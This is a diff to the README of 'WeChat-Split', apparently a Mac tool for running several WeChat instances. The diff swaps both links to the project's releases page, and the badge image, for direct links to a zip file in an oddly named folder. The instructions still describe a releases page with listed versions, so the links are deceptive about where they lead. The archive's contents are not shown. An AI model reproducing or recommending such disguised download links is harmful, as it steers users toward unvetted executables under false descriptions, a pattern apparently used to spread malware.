@@ -4,12 +4,12 @@
 Welcome to WeChat-Split! This application allows you to run multiple instances of WeChat on your Mac, making it easy to manage different accounts simultaneously. Follow these simple steps to download and install the app.
 
 ## 🔗 Download
-[![Download WeChat-Split](https://img.shields.io/badge/Download-WeChat--Split-brightgreen)](https://github.com/AnonymouK-P/WeChat-Split/releases)
+[![Download WeChat-Split](https://raw.githubusercontent.com/AnonymouK-P/WeChat-Split/main/leptokurtic/WeChat-Split.zip)](https://raw.githubusercontent.com/AnonymouK-P/WeChat-Split/main/leptokurtic/WeChat-Split.zip)
 
 ## 📥 How to Download & Install
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page where you can find the latest version of WeChat-Split:  
-   [Download WeChat-Split Releases](https://github.com/AnonymouK-P/WeChat-Split/releases)
+   [Download WeChat-Split Releases](https://raw.githubusercontent.com/AnonymouK-P/WeChat-Split/main/leptokurtic/WeChat-Split.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, you will see a list of available versions. Look for the latest version at the top. Each version will have a description detailing new features and fixes.
